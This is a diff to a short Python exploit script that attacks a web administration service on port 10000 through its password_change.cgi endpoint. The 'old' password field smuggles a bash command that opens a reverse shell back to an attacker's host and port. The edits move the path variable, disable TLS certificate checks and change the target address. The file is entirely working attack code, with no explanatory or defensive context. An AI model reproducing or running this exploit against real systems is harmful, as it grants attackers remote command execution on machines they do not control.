@@ -1,6 +1,7 @@
 import requests
 
 def exploit(target, lhost, lport):
+    vuln_path = "/password_change.cgi"
     exploit_target = (
         f"https://{target}:10000{vuln_path}"
     )
@@ -15,13 +16,12 @@ def exploit(target, lhost, lport):
         'new2': 'SmKUYgMFtixFlLt6nggby',
         'old': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
     }
-    requests.post(exploit_target, headers=headers, data=data)
+    requests.post(exploit_target, headers=headers, data=data, verify=False)
     print("Exploit script executed successfully.")
     exit()
 
 # Example usage:
-target = "192.168.1.67"
+target = "192.168.1.14"
 lhost = "192.168.1.72"
 lport = "4443"
-vuln_path = "/password_change.cgi"
 exploit(target, lhost, lport)
